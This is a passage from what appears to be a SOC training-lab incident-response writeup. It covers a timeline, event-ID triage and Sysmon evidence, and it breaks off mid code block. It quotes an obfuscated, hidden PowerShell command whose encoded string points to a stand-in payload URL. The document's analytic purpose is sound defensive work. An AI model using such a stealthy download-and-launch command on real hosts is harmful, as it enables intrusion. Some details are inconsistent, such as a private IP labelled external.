# Cyber Defense & Incident Response Writeup

- **Platform:** TryHackMe / Practical SOC Lab
- **Category:** SOC Operations & Incident Response
- **Frameworks Applied:** MITRE ATT&CK, NIST Incident Response Lifecycle
- **Difficulty:** Medium

---

## 1. Executive Summary
This writeup covers an incident investigation of an endpoint compromise within an enterprise network. An external attacker gained initial access via an unpatched service, executed malicious PowerShell scripts, and attempted privilege escalation. The objective was to perform alert triage, trace the attack vector, analyze forensic evidence, and document containment strategies.

---

## 2. Incident Timeline & Detection

| Time (UTC) | Event Phase | Activity Description | Detection Mechanism |
| :--- | :--- | :--- | :--- |
| **10:14:02** | Reconnaissance | Port scanning against external IP (`10.10.150.12`) | Snort IDS Alert |
| **10:18:45** | Initial Access | Exploitation of web service misconfiguration | HTTP Log Anomaly |
| **10:22:10** | Execution | Obfuscated PowerShell script launched on Host | Sysmon Event ID 1 |
| **10:25:00** | Privilege Escalation | Abuse of local administrator token misconfiguration | Security Event ID 4672 |

---

## 3. Investigation & Investigation Steps

### Initial Alert Triage
1. Monitored high-severity alerts in the SIEM for Event ID `4625` (Failed Logon) followed immediately by Event ID `4624` (Successful Logon) from an anomalous internal IP.
2. Cross-referenced the source IP with threat intelligence lists to verify non-standard origin.

### Endpoint Analysis (Sysmon & Event Viewer)
* **Execution Evidence:** Reviewed Sysmon Event ID 1 (Process Creation).
* **Command Executed:**
  ```cmd
  powershell.exe -nop -w hidden -e aHR0cDovL21hbGljaW91cy1kb21haW4uY29tL3BheWxvYWQucHMx
